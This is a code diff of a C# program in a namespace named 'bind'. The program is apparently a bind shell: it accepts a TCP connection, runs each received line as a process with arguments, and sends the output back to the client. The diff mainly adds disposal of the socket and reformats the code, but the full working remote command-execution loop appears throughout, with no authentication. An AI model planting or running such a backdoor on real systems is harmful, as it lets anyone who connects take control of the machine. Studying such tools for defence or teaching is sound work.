@@ -23,39 +23,41 @@ namespace bind
 					return;
 				}
 
-				using (NetworkStream stream = new NetworkStream (listener.AcceptSocket ())) {
-					using (StreamReader rdr = new StreamReader (stream)) {
-						while (true) {
-							string cmd = rdr.ReadLine ();
+				using (Socket socket = listener.AcceptSocket ()) {
+					using (NetworkStream stream = new NetworkStream (socket)) {
+						using (StreamReader rdr = new StreamReader (stream)) {
+							while (true) {
+								string cmd = rdr.ReadLine ();
 
-							if (string.IsNullOrEmpty (cmd)) {
-								rdr.Close ();
-								stream.Close ();
-								listener.Stop ();	
-								return;
-							}
+								if (string.IsNullOrEmpty (cmd)) {
+									rdr.Close ();
+									stream.Close ();
+									listener.Stop ();	
+									return;
+								}
 
-							if (string.IsNullOrWhiteSpace (cmd))
-								continue;
+								if (string.IsNullOrWhiteSpace (cmd))
+									continue;
 
-							string[] split = cmd.Trim().Split(' ');
-							string filename = split.First();
-							string arg = string.Join(" ", split.Skip(1));
+								string[] split = cmd.Trim ().Split (' ');
+								string filename = split.First ();
+								string arg = string.Join (" ", split.Skip (1));
 
-							try {
-								Process prc = new Process ();
-								prc.StartInfo = new ProcessStartInfo ();
-								prc.StartInfo.FileName = filename;
-								prc.StartInfo.Arguments = arg;
-								prc.StartInfo.UseShellExecute = false;
-								prc.StartInfo.RedirectStandardOutput = true;
-								prc.Start ();
-								prc.StandardOutput.BaseStream.CopyTo(stream);
-								prc.WaitForExit ();
-							} catch{
-								string error = "Error running command " + cmd + "\n";
-								byte[] errorBytes = Encoding.ASCII.GetBytes (error);
-								stream.Write (errorBytes, 0, errorBytes.Length);
+								try {
+									Process prc = new Process ();
+									prc.StartInfo = new ProcessStartInfo ();
+									prc.StartInfo.FileName = filename;
+									prc.StartInfo.Arguments = arg;
+									prc.StartInfo.UseShellExecute = false;
+									prc.StartInfo.RedirectStandardOutput = true;
+									prc.Start ();
+									prc.StandardOutput.BaseStream.CopyTo (stream);
+									prc.WaitForExit ();
+								} catch {
+									string error = "Error running command " + cmd + "\n";
+									byte[] errorBytes = Encoding.ASCII.GetBytes (error);
+									stream.Write (errorBytes, 0, errorBytes.Length);
+								}
 							}
 						}
 					}
